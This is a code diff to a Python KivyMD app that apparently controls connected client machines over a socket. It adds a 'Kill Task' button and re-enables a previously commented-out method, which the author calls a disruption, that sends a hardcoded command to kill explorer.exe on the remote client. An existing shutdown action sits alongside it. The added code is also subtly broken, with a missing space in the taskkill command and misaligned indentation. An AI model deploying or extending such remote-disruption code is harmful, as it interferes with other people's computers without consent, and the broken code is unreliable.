@@ -92,6 +92,13 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Shutdown()
+            MDRectangleFlatButton:
+                id: killTaskBtn
+                text: "Kill Task"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.KillTask()
 '''
 
 class Main(MDApp):
@@ -229,18 +236,20 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             break
 
-"""
-
-UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
-def KillTask(self):
+    def KillTask(self):
     while True:
-        procname = input('Enter Process Name: ')
-        command = 'taskkill /im' + procname
+        #procname = input('Enter Process Name: ')
+        command = 'taskkill /im' + 'explorer.exe'
         self.currConn.send(command.encode())
         print('Command sent to client: ', command)
         output = self.currConn.recv(8096).decode()
         print('Output: ', output)
         break
+
+"""
+
+UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
+
 
 """
 
